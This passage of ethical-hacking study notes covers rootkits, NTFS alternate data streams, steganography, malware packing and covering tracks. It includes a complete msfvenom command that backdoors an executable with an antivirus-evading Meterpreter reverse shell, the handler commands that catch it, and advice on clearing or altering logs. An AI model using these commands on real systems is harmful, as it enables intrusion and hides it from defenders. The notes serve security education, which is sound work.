  - Hard to detect as they run with OS privileges (ring 0)
  - E.g. [Linux Mint website was hacked](https://www.zdnet.com/article/hacker-hundreds-were-tricked-into-installing-linux-mint-backdoor/) to distribute ISO files with malicious kernel.
- **Boot loader level**
  - Replaces the original bootloader with a malicious one
- **Application level**
  - Changes the behavior of the target application
- **Library level**
  - Designed to replace the original system calls in order to hide the attacker's activities
- ![Privilege rings for the x86 available in protected mode](img/privilege-rings-x86png.png)

### Popular rootkits

- **Horse Pill**, [slides](https://www.blackhat.com/docs/us-16/materials/us-16-Leibowitz-Horse-Pill-A-New-Type-Of-Linux-Rootkit.pdf), [code](https://github.com/r00tkillah/HORSEPILL)
  - Linux rootkit that:
    1. Infects systems via the initial RAM disk (drive)
    2. Deceives system owners using container primitives.
- **GrayFish**
  - Rootkit suspectedly used by NSA in USA in attacks against e.g. Iran.
  - Implanting hard drive firmware to gain access by MBR substitution
- **ZeroAccess / Sirefef**
  - Kernel-mode rootkit. That
    - Hides the infected driver on the disk
    - Enables read and write access to the encrypted files
  - Downloads other malware on an infected machine from a P2P botnet.
- **Necurs**
  - Infector and rootkit with worlds largest P2P botnet
  - Distributes many malware, including [Locky](https://en.wikipedia.org/wiki/Locky) ransomware.
  - [Taken down](https://blogs.microsoft.com/on-the-issues/2020/03/10/necurs-botnet-cyber-crime-disrupt/) by Microsoft and its partners in 2019
- **Grayfish**
  - Developed by Equation Group that's considered to be part of the NSA.

### Bootkit

- Kernel-mode rootkit that runs every time computer runs
- Can bypass code signing (kernel-level) in Windows by attaching itself to the master boot record (MBR) of a hard drive
  - Then the rootkit is able to modify boot sequences and other options
  - Allows rootkit to be loaded before the Windows kernel is loaded
- See also [boot sector infectors](./../07-malware/viruses.md#boot-sector-infectors)

## NTFS file system

### NTFS Data Stream

- Two data streams that help NTFS store files.
  1. Stores data about the file (e.g. permissions)
  2. Stores file data

### Alternate data stream (ADS)

- Stream that's not in the file but attached to file through the Master File Table
  - the Master File Table contains a list of all file data streams and their locations on the disk
- Contains file metadata such as file attributes, author, access, and word count
- Enables attackers to inject malicious code into files and execute it
- Hard to detect because the file size and the contents remain the same.
  - Only way is to check the timestamps to detect tampering.

## Hiding files from GUI

- **Linux and macOS**
  - Prepend single dot (`.` ) in names of files/folders.
- **Windows**
  - Uses a file attribute named hidden for that
  - E.g. by using `ATTRIB +H` command
- Very easy to identify and display with command line or by changing GUI settings

## Steganography

- 📝 Technique which hides a message within another message.
  - E.g. an image that's still preserved but you embed your data into it.
- Used for maintaining information confidentiality
  - E.g. lighting a candle to reveal the secret message in the past.
- Implementations lacking a sharing secret are forms of security through obscurity
- Often reversible, hidden message is extracted when it arrives to its destination.
  - Or can be used to watermark to copyright of images, videos etc.
- Used by attackers to e.g. hide keyloggers, or inserting source code for hacking tools.
- Can be:
  - **Technical stenography**: uses scientific methods to hide messages
  - **Linguistic stenography**: uses a carrier to hide messages
- Can be: • Image • Document • Folder • Video • Audio • Web • Spam/email • DVD-ROM • Natural text • Hidden OS • Source Code

### Steganalysis

- Discovering of the hidden data in a medium
- Two phases
  1. **Detection**: ensuring existence of hidden information
  2. **Distortion**: trying to extract the hidden message
- Methods:
  - **Stego only attack**
    - Only the stego-object is available for analysis.
  - **Known stego attack**
    - Steganography algorithm is known and both the original and stego-object are available.
  - **Known message attack**
    - Hidden message and the corresponding stego-image are known.
    - The analysis of patterns that correspond to the hidden information could help decipher such messages in future.
  - **Known cover attack**
    - The stego-object as well as the original medium is available.
    - The stego-object is compared with the original cover object to detect any hidden information.
  - **Chosen message attack**
    - The steganalyst generates a stego-object from some stenography tool or algorithm of a chosen message.
    - The goal in this attack is to determine patterns in the stego-object that may point to the use of specific stenography tools or algorithms.
  - **Chosen stego attack**
    - The stenography algorithm and stego-object are known.

#### `steghide`

- [Tool](http://steghide.sourceforge.net/index.php) to embed and extract data from JPEG, BMP, WAV and AU.
- `steghide embed -cf test.jpg -ef hide-me.txt`
  - `-cf`: target file where the data will be hid
  - `-ef`: file to be embedded
  - Asks you for passphrase to encrypt the data
- `steghide extract -sf test.jpg`

### Packing Malware

- Embedding malware in other files (e.g. PDF, JPEG) to make it hidden
- Executable files to embed are good as they'll execute your malware when they're executed.
- You can do it
  - manually (hard to do, hard do detect)
  - or in a standardized way (automated, but detected easily)
- E.g. many crack files come with embedded malware.

#### `msfvenom`

- 📝 Payload generator and packer in [Metasploit framework](./../05-vulnerabilities/automated-penetration-testing-tools.md#metasploit).
- [Usage](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom) e.g. `msfvenom -a x86 --platform-windows -x /root/Downloads/someProgram.exe -k -p windows/meterpreter/reverse_tcp LHOST=192.168.122.110 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o program.exe`
  - `-x`: Executable that'll be patched (injected)
  - `-k`: Keep functionality in the program
  - `-p`: Payload to inject
    - In the example it's reverse shell that gives remote access.
    - Server becomes client (creates connection), client becomes server.
    - Victim communicates back to the attacking machine
  - `-e x86/shikata_ga_nai`: Encoder to avoid antivirus detection
  - `-i 3`: Encode 3 times for more stealth
  - Once it's executed you can start listening to the infected computer using:
    - [`msfconsole`](./../05-vulnerabilities/automated-penetration-testing-tools.md#msfconsole) to start listening to the IP address:
      - `use exploit/multi/handler`
      - `set payload windows/shell/reverse_tcp`
      - `set LHOST <target-ip-address>`
      - `set LPORT 4444`
      - `exploit`
- See also [MSFvenom | Automated penetration testing tools](./../05-vulnerabilities/automated-penetration-testing-tools.md#msfvenom)
# Covering tracks

- Attempt to hide attackers presence on the system so the system appears uncompromised.
- To avoid detection the attacker needs to
  - modify the system logs and delete their activity during the attack.
  - ensure that future activities are not logged
- You can mitigate damage by reducing footprint by e.g. making your access disguise a legit process.
- 💡 Have an exit strategy prior to breaking in by getting to know OS type, log types, policies (e.g. log altered alarms) and applications running on it.
  - E.g. if you know OS you can know where in general the OS keeps logs (e.g. `/var/log/`)
  - ❗ There's no universal way to figure out where all the logs are in a system
- Log file permissions
  - Common and big mistake: bad permissions on log files
    - Allows access from a lot of users that shouldn't
  - E.g. to read system messages you need to become root `sudo tail /var/log/messages`
- Terminal history
  - Might leave footprints here for commands you run.
  - Good place to learn about the user (they sometimes write passwords by mistake).
  - You can run `history` to get the history.
    - In (fedora) saved in `home/<username>/.bash_history`

## Security logs

### Windows security logs

- Event logs for are stored in `C:\Windows\System32\winevt\Logs`
- Can use OS tool "Windows Event Viewer" to navigate the logs
- Logs are categorized as application, security and system.

### Linux security logs

- Centralized repository of log files are in `/var/log` directory.
  - See also [Linux folders | Linux basics](./linux-basics.md#linux-folders)
- 📝 Log folders include
  - `/var/log/messages` | `/var/log/syslog` (debian-based)
    - Generic system activity logs
  - `/var/log/auth.log` (Debian and Ubuntu) | `/var/log/secure` (RedHat and CentOS)
    - Authentication/authorization related events
    - E.g. [SSH](./../15-cryptography/tunneling-protocols.md#ssh-secure-shell) logs
  - • `/var/log/utmp` • `/var/log/wtmp` • `/var/log/btmp` | `/var/log/faillog`
    - Login/logout events
  - `/var/log/lastlog`
    - Display information about a user's last login time
  - `/var/log/cron`
    - Cron service logs
    - Can include failed authorizations
  - `/var/log/secure`
    - Authentication and authorization privileges.
    - E.g. sshd logs including unsuccessful login.

## Techniques of covering tracks

- **Disabling auditing**
  - Disabling auditing features of the system
  - Disabling logging is difficult
    - Hard to know what kind of logs are being collected
    - Can include OS logs, additional security mechanisms logs, side applications logs..
    - Usually requires system restart for disabling of logs
      - E.g. if you use SELinux (can check with `getenforce`) it has different modes: • permissive (just logs) • enforcing and • disabled state
        - Setting its state to disabled requires a restart.
- **Clearing logs**
  - Deleting the attacker's logged activities
  - ❗Suspicious if all logs are deleted may raise alarms.
- **Manipulating logs**:
  - Changing the logs to prevent detection
  - E.g. search and replace your IP
- To cover tracks on network, attackers use

### Covering tracks on network

- **Reverse shell**
  - Target system sends a request to the remote system to act on the response.
  - **Reverse HTTP shells**
    - Asks the master system for commands to execute on the target machine
  - **Reverse ICMP tunnels**
    - Accessing the system by using ICMP echo and reply packets as carriers of TCP payload
- **DNS tunneling**
  - Adding data payload to the target's DNS server to create a back channel to steal information
- **TCP parameters**
  - Using TCP parameters for payload distribution.
  - Fields in which data can be hidden are e.g.
    - IP identification field, TCP acknowledgement number, and TCP initial sequence number.

### Tools for covering tracks

- [Privacy.sexy](https://privacy.sexy): Online/offline nad open source tool that can cleanup logs and personal activities.
- [Auditpol](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol): Microsoft tool to manipulate audit policies.
- [MRU-blaster](https://www.brightfort.com/mrublaster.html): Find and remove 30,000 MRU lists.
